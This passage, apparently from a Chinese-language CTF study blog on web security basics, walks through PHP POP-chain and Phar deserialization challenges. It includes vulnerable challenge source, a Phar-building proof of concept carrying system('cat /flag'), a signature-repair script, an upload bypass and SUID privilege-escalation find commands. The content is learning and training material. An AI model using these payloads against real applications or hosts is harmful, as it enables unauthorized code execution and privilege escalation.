class="line">	<span class="keyword">protected</span> <span class="variable">$yicheng</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$pojun</span></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">include</span>(<span class="variable">$pojun</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;yicheng);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Jie_Xusheng</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$sha</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$jiu</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$secret</span> = <span class="string">&#x27;reward.php&#x27;</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;sha = <span class="variable">$secret</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;jiu-&gt;sha;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/file|ftp|http|https|gopher|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;sha))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;你休想偷看吴国机密&quot;</span>;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;sha = <span class="string">&quot;reward.php&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;你什么都没看到？那说明……有东西你没看到&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xusheng&#x27;</span>])) &#123;</span><br><span class="line">	@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xusheng&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Jie_Xusheng</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 铸下这铁链，江东天险牢不可破！</span></span><br></pre></td></tr></table></figure>

<p><strong>构造Payload</strong></p>
<ol>
<li>设置 <code>TieSuoLianHuan</code> 的 <code>yicheng</code> 为 <strong>php:&#x2F;&#x2F;filter&#x2F;convert.base64-</strong></li>
</ol>
<p><strong>encode&#x2F;resource&#x3D;flag.php</strong> （需URL编码）</p>
<ol start="2">
<li>将 <code>TieSuoLianHuan</code> 实例赋值给 <code>GuDingDao</code> 的 <code>desheng</code> </li>
<li>将 <code>GuDingDao</code> 实例赋值给 <code>Jie_Xusheng (B)</code> 的 jiu 属性</li>
<li>将 <code>Jie_Xusheng</code> (B) 作为 <code>Jie_Xusheng (A)</code> 的 sha 属性</li>
<li>序列化对象A，确保属性命名和类名正确。</li>
</ol>
<h3 id="3-Phar反序列化"><a href="#3-Phar反序列化" class="headerlink" title="(3)Phar反序列化"></a>(3)Phar反序列化</h3><p>[文件上传与Phar反序列化的摩擦_<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_53090346/article/details/127676088">nssround#4 swpu]1zweb(revenge)-CSDN博客</a></p>
<p><code>php -d phar.readonly=0 class5.php</code>(核心出装)</p>
<h4 id="1-ezphar"><a href="#1-ezphar" class="headerlink" title="1.ezphar"></a>1.ezphar</h4><p>1</p>
<h4 id="2-bypass"><a href="#2-bypass" class="headerlink" title="2.bypass"></a>2.bypass</h4><h5 id="NSSRound-4-SWPU-1zweb-NSSCTF"><a href="#NSSRound-4-SWPU-1zweb-NSSCTF" class="headerlink" title="[NSSRound#4 SWPU]1zweb | NSSCTF"></a>[<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2484">NSSRound#4 SWPU]1zweb | NSSCTF</a></h5><p>POC:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoveNss</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ljt</span>=<span class="string">&quot;Misc&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dky</span>=<span class="string">&quot;Re&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">LoveNss</span>();</span><br><span class="line"> </span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); <span class="comment">//自定义的meta-data</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算,默认是SHA1</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>修复签名:(修改了类型数量)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;phar.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    f = file.read() </span><br><span class="line">s = f[:-<span class="number">28</span>] <span class="comment"># 获取要签名的数据</span></span><br><span class="line">h = f[-<span class="number">8</span>:] <span class="comment"># 获取签名类型和GBMB标识</span></span><br><span class="line">newf = s + sha256(s).digest() + h <span class="comment"># 数据 + 签名 + (类型 + GBMB)</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;newtest.phar&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(newf) <span class="comment"># 写入新文件</span></span><br></pre></td></tr></table></figure>

<p>kali自带gzip压缩后更改为白名单后缀上传</p>
<p>访问<code>phar://upload/3.png</code></p>
<h3 id="4-Pickle反序列化"><a href="#4-Pickle反序列化" class="headerlink" title="(4)Pickle反序列化"></a>(4)Pickle反序列化</h3><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>主要介绍bash的反弹</p>
<h2 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find /-user root -perm-4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line">find /-perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find /-user root -perm -4000 -<span class="built_in">exec</span> <span class="built_in">ls</span> -ldb &#123;&#125;\;</span><br></pre></td></tr></table></figure>



<h2 id="XSleaks"><a href="#XSleaks" class="headerlink" title="XSleaks"></a>XSleaks</h2><p>简介+原理（利用条件）+例题</p>
<h2 id="Python原型链污染"><a href="#Python原型链污染" class="headerlink" title="Python原型链污染"></a>Python原型链污染</h2><p>原理+例题</p>
<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h4 id="Mini-L-CTF-2025-西电-CTF-终端-Clickclick"><a href="#Mini-L-CTF-2025-西电-CTF-终端-Clickclick" class="headerlink" title="Mini L-CTF 2025 - 西电 CTF 终端 Clickclick"></a><a target="_blank" rel="noopener" href="https://ctf.xidian.edu.cn/training/18?challenge=822">Mini L-CTF 2025 - 西电 CTF 终端</a> Clickclick</h4><h2 id="Python代码审计综合"><a href="#Python代码审计综合" class="headerlink" title="Python代码审计综合"></a>Python代码审计综合</h2><p>主要配合例题讲解（每道例题会综合一下上面部分知识点）</p>
<p>[BUUCTF在线评测](<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[watevrCTF-2019]Pickle">https://buuoj.cn/challenges#[watevrCTF-2019]Pickle</a> Store) Pickle store</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://PureStream108.github.io/project">Pure Stream</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://purestream108.github.io/project/2025/05/17/Web%E5%9F%BA%E7%A1%80/">https://purestream108.github.io/project/2025/05/17/Web基础/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://PureStream108.github.io/project" target="_blank">PureStream & Marblue</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web/">Web</a></div><div class="post-share"><div class="social-share" data-image="/img/purestream.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/04/23/JNDI%E6%B3%A8%E5%85%A5/" title="JNDI注入"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-23</div><div class="info-item-2">JNDI注入</div></div><div class="info-2"><div class="info-item-1">JNDI注入Java漏洞在黑盒实战中的技巧——JNDI注入篇 - FreeBuf网络安全行业门户 JAVA安全之Log4j-Jndi注入原理以及利用方式_log4j jndi-CSDN博客 Java安全之JNDI注入 - nice_0e3 - 博客园 JNDI注入原理及利用考究-先知社区 深入理解JNDI注入与Java反序列化漏洞利用 - 博客 - 腾讯安全应急响应中心 JNDI(Java Naming and Directory Interface,Java命名和目录接口)是SUN公司提供的一种标准的Java命名系统接口，JNDI提供统一的客户端API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。目录服务是命名服务的一种自然扩展 JNDI(Java Naming and Directory...</div></div></div></a><a class="pagination-related" href="/2025/05/09/mini-L-CTF2025-Web%E5%A4%8D%E7%8E%B0/" title="mini L-CTF2025 Web复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-09</div><div class="info-item-2">mini L-CTF2025 Web复现</div></div><div class="info-2"><div class="info-item-1">Mini L-CTF2025 Web复现好多游戏题，JS和 JAVA啊，一个不会啊，虽然那题Python也不太会（），美美Web爆零，但是做出来一道MISC的JS游戏题，就有点离谱….  Click and Click 一进来是个按钮，要求点到10000次，手点肯定不可能，直接看JS源码，拉到最下面可以发现关键代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162function wn(t, e) &#123;    ce(e, !1);    const r = &quot;/update-amount&quot;;    let n = Wr(e, &quot;count&quot;, 12);    Jr();    var s = mn();    s.__click = [yn, n, r];    var o = Pt(s);    Tr( () =&gt; $r(o, `count...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/lazy.gif" data-original="/img/purestream.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Pure Stream</div><div class="author-info-description">Web保底人 & X1cT34m</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">15</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU"><i class="fab fa-github"></i><span>LamentXU头号粉丝</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/PureStream108" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://www.mihoyo.com/" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">个人说明(推)：知更鸟，芙宁娜，夏洛蒂，春日野穹，星（崩铁），希儿（崩铁），三无Marblue，狂热蓝调德尔塔，朔夜观星，遐蝶，爱可菲</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web%E5%9F%BA%E7%A1%80-%E6%9A%82%E5%AE%9A%EF%BC%8C%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0"><span class="toc-number">1.</span> <span class="toc-text">Web基础(暂定，持续更新)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%B7%E9%A2%98%E7%BD%91%E7%AB%99"><span class="toc-number">1.1.</span> <span class="toc-text">刷题网站</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="toc-number">1.2.</span> <span class="toc-text">常用工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E6%9F%A5%E7%9C%8B"><span class="toc-number">1.3.</span> <span class="toc-text">源码查看</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%A7%E5%88%B6%E5%8F%B0-%E6%B8%B8%E6%88%8F"><span class="toc-number">1.4.</span> <span class="toc-text">控制台+游戏</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP"><span class="toc-number">1.5.</span> <span class="toc-text">HTTP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E5%88%99"><span class="toc-number">1.6.</span> <span class="toc-text">正则</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EasyPHP"><span class="toc-number">1.7.</span> <span class="toc-text">EasyPHP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BUUCTF%E5%9C%A8%E7%BA%BF%E8%AF%84%E6%B5%8B-https-buuoj-cn-challenges-NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-Begin-of-PHP"><span class="toc-number">1.7.1.</span> <span class="toc-text">[BUUCTF在线评测](https:&#x2F;&#x2F;buuoj.cn&#x2F;challenges#[NewStarCTF 2023 公开赛道]Begin of PHP)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BUUCTF%E5%9C%A8%E7%BA%BF%E8%AF%84%E6%B5%8B-https-buuoj-cn-challenges-NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-R-C-E"><span class="toc-number">1.7.2.</span> <span class="toc-text">[BUUCTF在线评测](https:&#x2F;&#x2F;buuoj.cn&#x2F;challenges#[NewStarCTF 2023 公开赛道]R!C!E!)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.8.</span> <span class="toc-text">PHP伪协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.9.</span> <span class="toc-text">文件包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.10.</span> <span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%99%AE%E9%80%9Aphp-phtml%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.10.1.</span> <span class="toc-text">(1)普通php&#x2F;phtml文件上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%80%9A%E8%BF%87burpsuite%E6%8B%A6%E6%88%AA%E6%8A%93%E5%8C%85%E6%9B%B4%E6%94%B9%E5%90%8E%E7%BC%80"><span class="toc-number">1.10.2.</span> <span class="toc-text">(2)通过burpsuite拦截抓包更改后缀</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C"><span class="toc-number">1.10.2.1.</span> <span class="toc-text">攻防世界</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E9%80%9A%E8%BF%87-htaccess%E6%88%96%E8%80%85user-ini%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.10.3.</span> <span class="toc-text">(3)通过.htaccess或者user.ini进行文件上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E9%80%9A%E8%BF%87%E6%96%87%E4%BB%B6%E5%90%8D%E4%BC%A0%E9%A9%AC"><span class="toc-number">1.10.4.</span> <span class="toc-text">(4)通过文件名传马</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSTI"><span class="toc-number">1.11.</span> <span class="toc-text">SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8E%9F%E7%90%86"><span class="toc-number">1.11.1.</span> <span class="toc-text">(1)原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%9F%BA%E7%A1%80"><span class="toc-number">1.11.2.</span> <span class="toc-text">(2)基础</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#RUST%E4%B8%8B%E7%9A%84SSTI"><span class="toc-number">1.11.2.1.</span> <span class="toc-text">RUST下的SSTI</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HNCTF-2022-WEEK2-ez-SSTI-NSSCTF"><span class="toc-number">1.11.2.2.</span> <span class="toc-text">[HNCTF 2022 WEEK2]ez_SSTI | NSSCTF</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%BB%BC%E5%90%88%E7%BB%95%E8%BF%87"><span class="toc-number">1.11.3.</span> <span class="toc-text">(3)综合绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web-python-template-injection"><span class="toc-number">1.11.3.1.</span> <span class="toc-text">攻防世界 Web_python_template_injection</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL"><span class="toc-number">1.12.</span> <span class="toc-text">SQL</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.12.1.</span> <span class="toc-text">(1)联合查询</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-NewsCenter"><span class="toc-number">1.12.1.1.</span> <span class="toc-text">攻防世界 NewsCenter</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BUUCTF%E5%9C%A8%E7%BA%BF%E8%AF%84%E6%B5%8B-https-buuoj-cn-challenges-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BabySQL-Baby-SQL%EF%BC%88%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-number">1.12.1.2.</span> <span class="toc-text">[BUUCTF在线评测](https:&#x2F;&#x2F;buuoj.cn&#x2F;challenges#[极客大挑战 2019]BabySQL) Baby SQL（双写绕过）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BUUCTF%E5%9C%A8%E7%BA%BF%E8%AF%84%E6%B5%8B-https-buuoj-cn-challenges-NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-ez-sql-EZ-sql%EF%BC%88%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-number">1.12.1.3.</span> <span class="toc-text">[BUUCTF在线评测](https:&#x2F;&#x2F;buuoj.cn&#x2F;challenges#[NewStarCTF 2023 公开赛道]ez_sql) EZ_sql（大小写绕过）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.12.2.</span> <span class="toc-text">(2)时间盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.12.3.</span> <span class="toc-text">(3)布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#BUUCTF%E5%9C%A8%E7%BA%BF%E8%AF%84%E6%B5%8B-https-buuoj-cn-challenges-CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World"><span class="toc-number">1.12.3.1.</span> <span class="toc-text">[BUUCTF在线评测](https:&#x2F;&#x2F;buuoj.cn&#x2F;challenges#[CISCN2019 华北赛区 Day2 Web1]Hack World)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXS"><span class="toc-number">1.13.</span> <span class="toc-text">XXS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%AD%98%E5%82%A8%E5%9E%8B"><span class="toc-number">1.13.1.</span> <span class="toc-text">(1)存储型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8F%8D%E5%B0%84%E5%9E%8B"><span class="toc-number">1.13.2.</span> <span class="toc-text">(2)反射型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-DOM%E5%9E%8B"><span class="toc-number">1.13.3.</span> <span class="toc-text">(3)DOM型</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE%E5%92%8CSSRF"><span class="toc-number">1.14.</span> <span class="toc-text">XXE和SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF"><span class="toc-number">1.14.1.</span> <span class="toc-text">SSRF</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE"><span class="toc-number">1.15.</span> <span class="toc-text">RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="toc-number">1.15.1.</span> <span class="toc-text">概念</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#RCE%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB"><span class="toc-number">1.15.1.0.1.</span> <span class="toc-text">RCE命令注入分类</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%97%A0%E8%BF%87%E6%BB%A4%E7%AE%80%E5%8D%95%E5%91%BD%E4%BB%A4%E6%8B%BC%E6%8E%A5"><span class="toc-number">1.15.2.</span> <span class="toc-text">(1)无过滤简单命令拼接</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CTFHUB"><span class="toc-number">1.15.2.1.</span> <span class="toc-text">CTFHUB</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NCTF2024"><span class="toc-number">1.15.2.2.</span> <span class="toc-text">NCTF2024</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%BF%87%E6%BB%A4%E5%91%BD%E4%BB%A4"><span class="toc-number">1.15.3.</span> <span class="toc-text">(2)过滤命令</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ezRCE"><span class="toc-number">1.15.3.1.</span> <span class="toc-text">ezRCE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BUUCTF%E5%9C%A8%E7%BA%BF%E8%AF%84%E6%B5%8B-https-buuoj-cn-challenges-%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-Write-shell"><span class="toc-number">1.15.3.2.</span> <span class="toc-text">[BUUCTF在线评测](https:&#x2F;&#x2F;buuoj.cn&#x2F;challenges#[红明谷CTF 2021]write_shell) Write_shell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%9B%9E%E6%BA%AF%E9%99%90%E5%88%B6"><span class="toc-number">1.15.4.</span> <span class="toc-text">(3)回溯限制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#NISACTF-2022-middlerce-NSSCTF"><span class="toc-number">1.15.4.1.</span> <span class="toc-text">[NISACTF 2022]middlerce | NSSCTF</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%884%EF%BC%89%E6%97%A0%E5%9B%9E%E6%98%BERCE%EF%BC%88%E5%88%A9%E7%94%A8http%E6%A0%87%E5%A4%B4%EF%BC%89"><span class="toc-number">1.15.5.</span> <span class="toc-text">（4）无回显RCE（利用http标头）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A"><span class="toc-number">1.16.</span> <span class="toc-text">目录穿越</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.17.</span> <span class="toc-text">反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-php%E4%B8%80%E8%88%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.17.1.</span> <span class="toc-text">(1)php一般反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web-php-unserialize"><span class="toc-number">1.17.1.1.</span> <span class="toc-text">攻防世界 Web_php_unserialize</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-php-Pop%E9%93%BE"><span class="toc-number">1.17.2.</span> <span class="toc-text">(2)php-Pop链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ISCC2025%E5%8C%BA%E5%9F%9F%E8%B5%9B-%E6%83%B3%E7%8A%AF%E5%A4%A7%E5%90%B4%E7%96%86%E5%9C%9F%E5%90%97"><span class="toc-number">1.17.2.1.</span> <span class="toc-text">ISCC2025区域赛 想犯大吴疆土吗</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.17.3.</span> <span class="toc-text">(3)Phar反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-ezphar"><span class="toc-number">1.17.3.1.</span> <span 